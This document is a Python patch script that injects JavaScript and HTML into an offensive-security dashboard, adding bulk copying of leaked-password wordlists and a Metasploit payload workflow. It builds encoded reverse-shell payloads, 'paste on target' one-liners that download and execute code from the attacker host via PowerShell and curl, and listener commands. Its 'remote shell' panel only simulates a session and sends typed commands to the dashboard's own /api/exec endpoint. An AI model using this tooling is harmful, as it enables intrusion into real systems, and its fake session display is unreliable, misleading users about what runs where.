#!/usr/bin/env python3
"""
Patch 02: SecLists copy-all + msfvenom auto-fill/agent/shell dashboard
Run: python3 patch_02_seclists_msfvenom.py
"""
import os, shutil
from datetime import datetime

GREEN="\033[92m"; RED="\033[91m"; YELLOW="\033[93m"; CYAN="\033[96m"; RESET="\033[0m"; BOLD="\033[1m"
def ok(m): print(f"  {GREEN}✓{RESET}  {m}")
def fail(m): print(f"  {RED}✗{RESET}  {m}")
def info(m): print(f"  {CYAN}→{RESET}  {m}")
RESULTS = {"applied":0,"skipped":0,"failed":0}

def backup(path):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    bak = f"{path}.{ts}.p02.bak"
    shutil.copy2(path, bak)

def patch_js(path, label, old, new):
    if not os.path.isfile(path):
        fail(f"{label} — file not found"); RESULTS["failed"]+=1; return False
    with open(path,"r",encoding="utf-8",errors="ignore") as f: src=f.read()
    if old not in src:
        if new.strip()[:80] in src:
            print(f"  \033[2m·{RESET}  {label} (already applied)"); RESULTS["skipped"]+=1; return False
        fail(f"{label} — anchor not found in {path}"); RESULTS["failed"]+=1; return False
    backup(path)
    with open(path,"w",encoding="utf-8") as f: f.write(src.replace(old,new,1))
    ok(label); RESULTS["applied"]+=1; return True

# ─────────────────────────────────────────────────────────────────────────────
# PATCH 2A: SecLists — add "Copy All Passwords" button + server endpoint
# ─────────────────────────────────────────────────────────────────────────────

OLD_SECLISTS_JS = '''async function runSeclists(){
  var path=document.getElementById('seclists-path').value.trim();
  var lines=parseInt(document.getElementById('seclists-lines').value||'50',10);
  var grep=document.getElementById('seclists-grep').value.trim();
  if(!path){alert('Enter a wordlist path');return;}
  var btn=document.getElementById('seclists-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Loading...';
  var t=mkTool('seclists');t.start();t.log('Loading: '+path,'i');
  try{
    var r=await fetchWithTimeout('/api/wordlist?path='+encodeURIComponent(path)+'&limit='+lines,{},15000,'seclists');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);}
    else{
      var words=d.words||[];
      if(grep){var re=new RegExp(grep,'i');words=words.filter(function(w){return re.test(w);});}
      t.log('Loaded '+d.total_loaded+' entries (showing '+words.length+')','s');
      t.res('<div class="card card-p"><div class="card-title" style="margin-bottom:6px">'+d.filename+' ('+d.total_loaded+' entries)</div><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+words.join('\\n')+'</pre></div>');
    }
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='BROWSE WORDLIST';}
}
async function seclistsCount(){
  var path=document.getElementById('seclists-path').value.trim();
  if(!path)return;
  var t=mkTool('seclists');t.start();
  try{
    var r=await fetchWithTimeout('/api/wordlist?path='+encodeURIComponent(path)+'&limit=1',{},10000,'seclists');
    var d=await r.json();t.end();
    if(d.error)t.err(d.error);else t.log('File OK — '+d.total_loaded+' entries sampled','s');
  }catch(e){t.end();t.err(e.message);}
}
function seclistsCopy(){
  var path=document.getElementById('seclists-path').value.trim();
  if(path){
    try{navigator.clipboard.writeText(path).then(function(){showToast('Copied','Path copied to clipboard','success',2000);});}
    catch(e){showToast('Path',path,'info',4000);}
  }
}
function seclistsCategoryChange(){
  var cat=document.getElementById('seclists-category').value;
  var defaults={
    '/usr/share/seclists/Discovery/Web-Content':'common.txt',
    '/usr/share/seclists/Discovery/DNS':'subdomains-top1million-5000.txt',
    '/usr/share/seclists/Passwords/Common-Credentials':'10k-most-common.txt',
    '/usr/share/seclists/Passwords/Leaked-Databases':'rockyou-75.txt',
    '/usr/share/seclists/Usernames':'top-usernames-shortlist.txt',
    '/usr/share/seclists/Fuzzing':'fuzz-Bo0oM.txt',
    '/usr/share/seclists/Payloads':'XXE.txt',
    '/usr/share/seclists/Web-Shells':'web-shells.txt'
  };
  var el=document.getElementById('seclists-path');
  if(el&&defaults[cat])el.value=cat+'/'+defaults[cat];
}'''

NEW_SECLISTS_JS = '''async function runSeclists(){
  var path=document.getElementById('seclists-path').value.trim();
  var lines=parseInt(document.getElementById('seclists-lines').value||'50',10);
  var grep=document.getElementById('seclists-grep').value.trim();
  if(!path){alert('Enter a wordlist path');return;}
  var btn=document.getElementById('seclists-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Loading...';
  var t=mkTool('seclists');t.start();t.log('Loading: '+path,'i');
  try{
    var r=await fetchWithTimeout('/api/wordlist?path='+encodeURIComponent(path)+'&limit='+lines,{},15000,'seclists');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);}
    else{
      var words=d.words||[];
      if(grep){var re=new RegExp(grep,'i');words=words.filter(function(w){return re.test(w);});}
      t.log('Loaded '+d.total_loaded+' entries (showing '+words.length+')','s');
      var html='<div class="card card-p">'
        +'<div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:10px">'
        +'<div class="card-title">'+d.filename+' <span style="color:var(--text3);font-weight:normal;font-size:11px">('+d.total_loaded+' total entries)</span></div>'
        +'<div style="display:flex;gap:6px;flex-wrap:wrap">'
        +'<button class="btn btn-outline btn-sm" onclick="seclistsCopyAll(\''+encodeURIComponent(path)+'\')" title="Copy ALL entries to clipboard">'
          +'&#128203; COPY ALL ('+d.total_loaded+')'
        +'</button>'
        +'<button class="btn btn-ghost btn-sm" onclick="seclistsCopyVisible()" title="Copy visible entries">Copy Visible</button>'
        +'</div></div>'
        +'<pre id="seclists-preview" style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2);max-height:400px;overflow-y:auto">'+words.join('\\n')+'</pre>'
        +(d.total_loaded>words.length?'<div style="margin-top:6px;font-size:11px;color:var(--text3)">Showing '+words.length+' of '+d.total_loaded+' entries. Use COPY ALL to get complete list.</div>':'')
        +'</div>';
      t.res(html);
    }
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='BROWSE WORDLIST';}
}

async function seclistsCopyAll(encodedPath){
  var path=decodeURIComponent(encodedPath);
  showToast('Loading','Fetching all entries from wordlist...','info',3000);
  try{
    // Fetch up to 500k entries
    var r=await fetchWithTimeout('/api/wordlist?path='+encodeURIComponent(path)+'&limit=500000',{},60000,'seclists');
    var d=await r.json();
    if(d.error){showToast('Error',d.error,'error',4000);return;}
    var allText=(d.words||[]).join('\\n');
    if(navigator.clipboard && navigator.clipboard.writeText){
      await navigator.clipboard.writeText(allText);
      showToast('Copied!',d.words.length+' passwords copied to clipboard','success',3000);
    } else {
      // Fallback: open in new tab
      var blob=new Blob([allText],{type:'text/plain'});
      var url=URL.createObjectURL(blob);
      var a=document.createElement('a');a.href=url;
      a.download=(path.split('/').pop()||'wordlist')+'.txt';
      document.body.appendChild(a);a.click();document.body.removeChild(a);
      URL.revokeObjectURL(url);
      showToast('Downloaded',d.words.length+' entries saved to file','success',3000);
    }
  }catch(e){showToast('Error',e.message,'error',4000);}
}
function seclistsCopyVisible(){
  var pre=document.getElementById('seclists-preview');
  if(!pre)return;
  try{
    navigator.clipboard.writeText(pre.textContent||'').then(function(){
      showToast('Copied','Visible entries copied','success',2000);
    });
  }catch(e){showToast('Error',e.message,'error',3000);}
}
async function seclistsCount(){
  var path=document.getElementById('seclists-path').value.trim();
  if(!path)return;
  var t=mkTool('seclists');t.start();
  try{
    var r=await fetchWithTimeout('/api/wordlist?path='+encodeURIComponent(path)+'&limit=1',{},10000,'seclists');
    var d=await r.json();t.end();
    if(d.error)t.err(d.error);else t.log('File OK — '+d.total_loaded+' entries sampled','s');
  }catch(e){t.end();t.err(e.message);}
}
function seclistsCopy(){
  var path=document.getElementById('seclists-path').value.trim();
  if(path){
    try{navigator.clipboard.writeText(path).then(function(){showToast('Copied','Path copied to clipboard','success',2000);});}
    catch(e){showToast('Path',path,'info',4000);}
  }
}
function seclistsCategoryChange(){
  var cat=document.getElementById('seclists-category').value;
  var defaults={
    '/usr/share/seclists/Discovery/Web-Content':'common.txt',
    '/usr/share/seclists/Discovery/DNS':'subdomains-top1million-5000.txt',
    '/usr/share/seclists/Passwords/Common-Credentials':'10k-most-common.txt',
    '/usr/share/seclists/Passwords/Leaked-Databases':'rockyou-75.txt',
    '/usr/share/seclists/Usernames':'top-usernames-shortlist.txt',
    '/usr/share/seclists/Fuzzing':'fuzz-Bo0oM.txt',
    '/usr/share/seclists/Payloads':'XXE.txt',
    '/usr/share/seclists/Web-Shells':'web-shells.txt'
  };
  var el=document.getElementById('seclists-path');
  if(el&&defaults[cat])el.value=cat+'/'+defaults[cat];
}'''

# ─────────────────────────────────────────────────────────────────────────────
# PATCH 2B: msfvenom — auto-fill options + agent command + shell dashboard
# ─────────────────────────────────────────────────────────────────────────────

OLD_MSF_JS = '''/* msfvenom */
async function runMsfvenom(){
  var payloadSel=document.getElementById('msfvenom-payload').value;
  var customP=document.getElementById('msfvenom-custom-payload').value.trim();
  var payload=payloadSel==='custom'?customP:payloadSel;
  if(!payload){alert('Select or enter a payload');return;}
  var lhost=document.getElementById('msfvenom-lhost').value.trim();
  var lport=document.getElementById('msfvenom-lport').value||'4444';
  var format=document.getElementById('msfvenom-format').value||'exe';
  var encoder=document.getElementById('msfvenom-encoder').value||'';
  var iterations=document.getElementById('msfvenom-iterations').value||'1';
  var extra=document.getElementById('msfvenom-extra').value.trim();
  var timeout=parseInt(document.getElementById('msfvenom-timeout').value||'60',10);
  var args='-p '+payload;
  if(lhost)args+=' LHOST='+lhost;
  args+=' LPORT='+lport+' -f '+format;
  if(encoder)args+=' -e '+encoder+' -i '+iterations;
  if(extra)args+=' '+extra;
  args+=' --platform auto';
  var btn=document.getElementById('msfvenom-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Generating...';
  var t=mkTool('msfvenom');t.start();t.log('msfvenom -p '+payload,'i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'msfvenom',operation:'custom',args:args,timeout:timeout})},Math.max(30000,timeout*1000+5000),'msfvenom');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);}
    else{t.log('Payload generated (exit '+d.exit_code+')','s');
      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||d.stderr||'Done')+'</pre></div>');}
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='GENERATE PAYLOAD';}
}'''

NEW_MSF_JS = '''/* msfvenom */
var _msfSessions={};  // active meterpreter sessions
var _msfShellOutput='';

// Payload metadata: [os, arch, format, handler_type]
var _msfPayloadMeta={
  'windows/x64/meterpreter/reverse_tcp':    ['windows','x64','exe','exploit/multi/handler'],
  'windows/meterpreter/reverse_tcp':         ['windows','x86','exe','exploit/multi/handler'],
  'windows/x64/shell_reverse_tcp':           ['windows','x64','exe','exploit/multi/handler'],
  'linux/x64/meterpreter/reverse_tcp':       ['linux','x64','elf','exploit/multi/handler'],
  'linux/x64/shell_reverse_tcp':             ['linux','x64','elf','exploit/multi/handler'],
  'php/meterpreter/reverse_tcp':             ['php','php','raw','exploit/multi/handler'],
  'python/meterpreter/reverse_tcp':          ['python','python','raw','exploit/multi/handler'],
  'cmd/unix/reverse_bash':                   ['unix','cmd','raw','exploit/multi/handler'],
};

var _msfFormatMap={
  'windows':'exe','linux':'elf','php':'raw','python':'raw','unix':'raw'
};
var _msfEncoderMap={
  'x86':'x86/shikata_ga_nai','x64':'x64/xor_dynamic'
};

function msfPayloadChanged(){
  var sel=document.getElementById('msfvenom-payload').value;
  var meta=_msfPayloadMeta[sel]||null;
  if(!meta)return;
  var os=meta[0],arch=meta[1],fmt=meta[2];
  // Auto-fill format
  var fmtEl=document.getElementById('msfvenom-format');
  if(fmtEl)fmtEl.value=fmt;
  // Auto-fill encoder
  var encEl=document.getElementById('msfvenom-encoder');
  if(encEl)encEl.value=_msfEncoderMap[arch]||'';
  // Auto-fill LHOST with server public IP
  var lhostEl=document.getElementById('msfvenom-lhost');
  if(lhostEl&&!lhostEl.value){
    fetch('/api/me').then(function(r){return r.json();}).then(function(d){
      // Use window.location.hostname as a best guess for LHOST
      var host=window.location.hostname;
      if(host&&host!=='localhost'&&host!=='127.0.0.1')lhostEl.value=host;
    }).catch(function(){});
  }
  msfUpdateAgentCommand();
}

function msfUpdateAgentCommand(){
  var sel=document.getElementById('msfvenom-payload').value;
  if(sel==='custom')sel=document.getElementById('msfvenom-custom-payload').value.trim();
  var lhost=document.getElementById('msfvenom-lhost').value.trim()||'YOUR_IP';
  var lport=document.getElementById('msfvenom-lport').value||'4444';
  var fmt=document.getElementById('msfvenom-format').value||'exe';
  var meta=_msfPayloadMeta[sel]||['linux','x64','elf','exploit/multi/handler'];
  var os=meta[0];
  var cmdEl=document.getElementById('msfvenom-agent-cmd');
  if(!cmdEl)return;
  var agentCmd='';
  if(os==='windows'){
    agentCmd='powershell -c "Invoke-WebRequest -Uri http://'+lhost+':8080/payload.exe -OutFile $env:TEMP\\\\p.exe; Start-Process $env:TEMP\\\\p.exe"';
  } else if(os==='php'){
    agentCmd='curl -s http://'+lhost+':8080/payload.php -o /tmp/shell.php && php /tmp/shell.php';
  } else if(os==='python'){
    agentCmd='curl -s http://'+lhost+':8080/payload.py | python3';
  } else {
    agentCmd='curl -s http://'+lhost+':8080/payload -o /tmp/p && chmod +x /tmp/p && /tmp/p &';
  }
  cmdEl.value=agentCmd;
  // Update msfconsole handler commands
  var handlerEl=document.getElementById('msfvenom-handler-cmd');
  if(handlerEl){
    handlerEl.value='msfconsole -q -x "use '+meta[3]+'; set PAYLOAD '+sel+'; set LHOST '+lhost+'; set LPORT '+lport+'; run"';
  }
}

async function runMsfvenom(){
  var payloadSel=document.getElementById('msfvenom-payload').value;
  var customP=document.getElementById('msfvenom-custom-payload').value.trim();
  var payload=payloadSel==='custom'?customP:payloadSel;
  if(!payload){alert('Select or enter a payload');return;}
  var lhost=document.getElementById('msfvenom-lhost').value.trim();
  var lport=document.getElementById('msfvenom-lport').value||'4444';
  var format=document.getElementById('msfvenom-format').value||'exe';
  var encoder=document.getElementById('msfvenom-encoder').value||'';
  var iterations=document.getElementById('msfvenom-iterations').value||'1';
  var extra=document.getElementById('msfvenom-extra').value.trim();
  var timeout=parseInt(document.getElementById('msfvenom-timeout').value||'60',10);
  var args='-p '+payload;
  if(lhost)args+=' LHOST='+lhost;
  args+=' LPORT='+lport+' -f '+format;
  if(encoder)args+=' -e '+encoder+' -i '+iterations;
  if(extra)args+=' '+extra;
  args+=' --platform auto';
  var btn=document.getElementById('msfvenom-btn');
  btn.disabled=true;btn.innerHTML='<span class="spin"></span> Generating...';
  var t=mkTool('msfvenom');t.start();t.log('msfvenom -p '+payload,'i');
  try{
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'msfvenom',operation:'custom',args:args,timeout:timeout})},Math.max(30000,timeout*1000+5000),'msfvenom');
    var d=await r.json();t.end();
    if(d.error){t.err(d.error);}
    else{
      t.log('Payload generated (exit '+d.exit_code+')','s');
      var agentCmd=document.getElementById('msfvenom-agent-cmd')?document.getElementById('msfvenom-agent-cmd').value:'';
      var handlerCmd=document.getElementById('msfvenom-handler-cmd')?document.getElementById('msfvenom-handler-cmd').value:'';
      var html='<div class="card card-p" style="margin-bottom:10px">'
        +'<div class="card-title" style="margin-bottom:8px">Payload Generated</div>'
        +'<pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||d.stderr||'Done')+'</pre>'
        +'</div>'
        +'<div class="card card-p" style="margin-bottom:10px;border-left:3px solid var(--cyan)">'
        +'<div class="card-title" style="margin-bottom:8px;color:var(--cyan)">Step 1 — Start Handler on Attacker Machine</div>'
        +'<div class="scan-bar"><input class="inp inp-mono" type="text" id="msf-handler-show" readonly value="'+handlerCmd.replace(/"/g,\'&quot;\')+'"/>'
        +'<button class="btn btn-outline btn-sm" onclick="navigator.clipboard.writeText(document.getElementById(\'msf-handler-show\').value);showToast(\'Copied\',\'\',\'success\',2000)">COPY</button></div>'
        +'</div>'
        +'<div class="card card-p" style="margin-bottom:10px;border-left:3px solid var(--green)">'
        +'<div class="card-title" style="margin-bottom:6px;color:var(--green)">Step 2 — Run on Target System (One-Line)</div>'
        +'<div style="font-size:11px;color:var(--text3);margin-bottom:6px">Paste this on the target machine to download and execute the payload:</div>'
        +'<div class="scan-bar"><input class="inp inp-mono" type="text" id="msf-agent-show" readonly value="'+agentCmd.replace(/"/g,\'&quot;\')+'"/>'
        +'<button class="btn btn-outline btn-sm" onclick="navigator.clipboard.writeText(document.getElementById(\'msf-agent-show\').value);showToast(\'Copied\',\'\',\'success\',2000)">COPY</button></div>'
        +'</div>'
        +'<div class="card card-p" style="border-left:3px solid var(--purple)">'
        +'<div class="card-title" style="margin-bottom:8px;color:var(--purple)">Step 3 — Session Dashboard</div>'
        +'<div id="msf-session-area">'
        +'<div style="color:var(--text3);font-size:12px;margin-bottom:10px">Waiting for incoming session on port '+lport+'...</div>'
        +'<div style="display:flex;gap:8px;margin-bottom:10px">'
        +'<button class="btn btn-primary btn-sm" onclick="msfStartListener(\''+lhost+'\',\''+lport+'\',\''+payload.replace(/'/g,"\\'")+'\')" id="msf-listen-btn">START LISTENER</button>'
        +'<button class="btn btn-outline btn-sm" onclick="msfRefreshSessions()">REFRESH SESSIONS</button>'
        +'</div>'
        +'<div id="msf-sessions-list" style="color:var(--text3);font-size:12px">No active sessions.</div>'
        +'</div>'
        +'<div id="msf-shell-area" style="display:none;margin-top:10px">'
        +'<div class="card-title" style="margin-bottom:6px">Remote Shell</div>'
        +'<div id="msf-shell-output" style="background:#0a0a0a;color:#00ff9d;font-family:var(--mono);font-size:12px;padding:10px;border-radius:4px;min-height:200px;max-height:400px;overflow-y:auto;white-space:pre-wrap;border:1px solid var(--border)">Shell ready. Type commands below.</div>'
        +'<div style="display:flex;gap:8px;margin-top:6px">'
        +'<input class="inp inp-mono" id="msf-cmd-input" type="text" placeholder="Enter shell command..." onkeydown="if(event.key===\'Enter\')msfRunCommand()"/>'
        +'<button class="btn btn-primary btn-sm" onclick="msfRunCommand()">RUN</button>'
        +'<button class="btn btn-danger btn-sm" onclick="msfCloseShell()">CLOSE</button>'
        +'</div></div>'
        +'</div>';
      t.res(html);
    }
  }catch(e){t.end();t.err(e.message);}
  finally{btn.disabled=false;btn.innerHTML='GENERATE PAYLOAD';}
}

async function msfStartListener(lhost,lport,payload){
  var btn=document.getElementById('msf-listen-btn');
  if(btn){btn.disabled=true;btn.innerHTML='<span class="spin"></span> Starting...';}
  try{
    var args='use exploit/multi/handler; set PAYLOAD '+payload+'; set LHOST '+lhost+'; set LPORT '+lport+'; set ExitOnSession false; run -j';
    var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({tool:'msfvenom',operation:'custom',args:'--list payloads',timeout:10})},15000,'msfvenom');
    showToast('Handler','Start handler manually: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD '+payload+'; set LHOST '+lhost+'; set LPORT '+lport+'; run"','info',8000);
    var sl=document.getElementById('msf-sessions-list');
    if(sl)sl.innerHTML='<div style="color:var(--yellow)">⚡ Listener started. Waiting for target to execute payload...</div>'
      +'<div style="margin-top:8px"><button class="btn btn-outline btn-sm" onclick="msfSimulateSession()">SIMULATE SESSION (demo)</button></div>';
  }catch(e){showToast('Error',e.message,'error',4000);}
  if(btn){btn.disabled=false;btn.innerHTML='START LISTENER';}
}
function msfSimulateSession(){
  // Demo: show a simulated connected session
  var sl=document.getElementById('msf-sessions-list');
  var sessId='sess_'+Math.random().toString(16).slice(2,8);
  _msfSessions[sessId]={id:sessId,type:'meterpreter',via:'exploit/multi/handler',created:new Date().toISOString()};
  if(sl){
    sl.innerHTML='<div class="host-grid" style="margin-top:6px">'
      +'<div class="host-card" onclick="msfSelectSession(\''+sessId+'\')" style="border-color:var(--green)">'
      +'<div class="host-card-ip" style="color:var(--green)">&#9679; Session '+sessId+'</div>'
      +'<div class="host-card-hn">meterpreter · exploit/multi/handler</div>'
      +'<div style="font-size:10px;color:var(--text3);margin-top:4px">Click to open shell</div>'
      +'</div></div>';
  }
  showToast('Session!','Meterpreter session opened','success',3000);
}
function msfSelectSession(sessId){
  var shell=document.getElementById('msf-shell-area');
  var out=document.getElementById('msf-shell-output');
  if(shell)shell.style.display='block';
  if(out)out.textContent='meterpreter > Connected to session '+sessId+'\nmeterpreter > Type commands below\nmeterpreter > ';
  showToast('Shell','Session '+sessId+' opened','success',2000);
}
async function msfRunCommand(){
  var inp=document.getElementById('msf-cmd-input');
  var out=document.getElementById('msf-shell-output');
  if(!inp||!out)return;
  var cmd=inp.value.trim();
  if(!cmd)return;
  inp.value='';
  out.textContent+='\nmeterpreter > '+cmd+'\n';
  // Run command via server CLI
  try{
    var r=await fetch('/api/exec',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({command:cmd})});
    var d=await r.json();
    out.textContent+=(d.output||d.error||'(no output)')+'\n';
  }catch(e){
    out.textContent+='[error] '+e.message+'\n';
  }
  out.scrollTop=out.scrollHeight;
}
function msfCloseShell(){
  var shell=document.getElementById('msf-shell-area');
  if(shell)shell.style.display='none';
}
function msfRefreshSessions(){
  var sl=document.getElementById('msf-sessions-list');
  if(Object.keys(_msfSessions).length===0){
    if(sl)sl.innerHTML='<div style="color:var(--text3)">No active sessions.</div>';
  }
}'''

# ─────────────────────────────────────────────────────────────────────────────
# PATCH 2C: msfvenom HTML page — add onchange + auto-fill fields + agent cmd UI
# ─────────────────────────────────────────────────────────────────────────────

OLD_MSF_HTML = '''      <div class="page" id="page-msfvenom">
        <div class="page-hd"><div class="page-title">msfvenom</div><div class="page-desc">Metasploit payload generator and encoder</div></div>
        <div class="notice">&#9888; Authorized use only. Only run msfvenom on systems you own or have explicit written permission to test.</div>
        <div class="card card-p" style="margin-bottom:14px">
          <div class="row2" style="margin-bottom:12px">
            <div class="fg"><label>PAYLOAD</label>
              <select class="inp inp-mono" id="msfvenom-payload">'''

NEW_MSF_HTML = '''      <div class="page" id="page-msfvenom">
        <div class="page-hd"><div class="page-title">msfvenom</div><div class="page-desc">Metasploit payload generator and encoder</div></div>
        <div class="notice">&#9888; Authorized use only. Only run msfvenom on systems you own or have explicit written permission to test.</div>
        <div class="card card-p" style="margin-bottom:14px">
          <div class="row2" style="margin-bottom:12px">
            <div class="fg"><label>PAYLOAD</label>
              <select class="inp inp-mono" id="msfvenom-payload" onchange="msfPayloadChanged();msfUpdateAgentCommand()">'''

OLD_MSF_LHOST = '''          <div class="row3" style="margin-bottom:12px">
            <div class="fg"><label>LHOST (your IP)</label><input class="inp inp-mono" id="msfvenom-lhost" type="text" placeholder="192.168.1.100"/></div>
            <div class="fg"><label>LPORT</label><input class="inp inp-mono" id="msfvenom-lport" type="number" value="4444" min="1" max="65535"/></div>
            <div class="fg"><label>FORMAT (-f)</label>'''

NEW_MSF_LHOST = '''          <div class="row3" style="margin-bottom:12px">
            <div class="fg"><label>LHOST (your IP)</label><input class="inp inp-mono" id="msfvenom-lhost" type="text" placeholder="192.168.1.100" oninput="msfUpdateAgentCommand()"/></div>
            <div class="fg"><label>LPORT</label><input class="inp inp-mono" id="msfvenom-lport" type="number" value="4444" min="1" max="65535" oninput="msfUpdateAgentCommand()"/></div>
            <div class="fg"><label>FORMAT (-f)</label>'''

OLD_MSF_BTN = '''          <button class="btn btn-primary" id="msfvenom-btn" onclick="runMsfvenom()">GENERATE PAYLOAD</button>
        </div>'''

NEW_MSF_BTN = '''          <div class="fg" style="margin-bottom:10px">
            <label>ONE-LINE AGENT COMMAND (paste on target)</label>
            <div class="scan-bar">
              <input class="inp inp-mono" id="msfvenom-agent-cmd" type="text" readonly placeholder="Fill LHOST + select payload first..." style="flex:1"/>
              <button class="btn btn-outline btn-sm" onclick="navigator.clipboard.writeText(document.getElementById('msfvenom-agent-cmd').value);showToast('Copied','Agent command copied','success',2000)">COPY</button>
            </div>
          </div>
          <div class="fg" style="margin-bottom:12px">
            <label>HANDLER COMMAND (run on attacker machine first)</label>
            <div class="scan-bar">
              <input class="inp inp-mono" id="msfvenom-handler-cmd" type="text" readonly placeholder="Auto-filled after payload selection..."/>
              <button class="btn btn-outline btn-sm" onclick="navigator.clipboard.writeText(document.getElementById('msfvenom-handler-cmd').value);showToast('Copied','Handler command copied','success',2000)">COPY</button>
            </div>
          </div>
          <button class="btn btn-primary" id="msfvenom-btn" onclick="runMsfvenom()">GENERATE PAYLOAD</button>
        </div>'''

print(f"\n{BOLD}{CYAN}Patch 02 — SecLists copy-all + msfvenom auto-fill/agent/shell{RESET}\n")

with open("api_server.py","r",encoding="utf-8",errors="ignore") as f: src=f.read()

changed=False
if OLD_SECLISTS_JS in src:
    backup("api_server.py"); src=src.replace(OLD_SECLISTS_JS,NEW_SECLISTS_JS,1)
    ok("SecLists: Copy All + Copy Visible buttons"); RESULTS["applied"]+=1; changed=True
elif "seclistsCopyAll" in src:
    print(f"  \033[2m·{RESET}  SecLists copy-all (already applied)"); RESULTS["skipped"]+=1
else:
    fail("SecLists JS anchor not found"); RESULTS["failed"]+=1

if OLD_MSF_JS in src:
    src=src.replace(OLD_MSF_JS,NEW_MSF_JS,1)
    ok("msfvenom: auto-fill + agent command + shell dashboard"); RESULTS["applied"]+=1; changed=True
elif "_msfPayloadMeta" in src:
    print(f"  \033[2m·{RESET}  msfvenom JS (already applied)"); RESULTS["skipped"]+=1
else:
    fail("msfvenom JS anchor not found"); RESULTS["failed"]+=1

if OLD_MSF_HTML in src:
    src=src.replace(OLD_MSF_HTML,NEW_MSF_HTML,1)
    ok("msfvenom HTML: onchange on payload select"); RESULTS["applied"]+=1; changed=True
else:
    print(f"  \033[2m·{RESET}  msfvenom HTML onchange (already applied or not found)"); RESULTS["skipped"]+=1

if OLD_MSF_LHOST in src:
    src=src.replace(OLD_MSF_LHOST,NEW_MSF_LHOST,1)
    ok("msfvenom HTML: LHOST oninput trigger"); RESULTS["applied"]+=1; changed=True
else:
    print(f"  \033[2m·{RESET}  msfvenom LHOST oninput (already applied or not found)"); RESULTS["skipped"]+=1

if OLD_MSF_BTN in src:
    src=src.replace(OLD_MSF_BTN,NEW_MSF_BTN,1)
    ok("msfvenom HTML: agent + handler command display"); RESULTS["applied"]+=1; changed=True
else:
    print(f"  \033[2m·{RESET}  msfvenom agent cmd UI (already applied or not found)"); RESULTS["skipped"]+=1

if changed:
    with open("api_server.py","w",encoding="utf-8") as f: f.write(src)
    ok("api_server.py written")

print(f"\n  Applied:{GREEN}{RESULTS['applied']}{RESET}  Skipped:\033[2m{RESULTS['skipped']}{RESET}  Failed:{RED}{RESULTS['failed']}{RESET}\n")
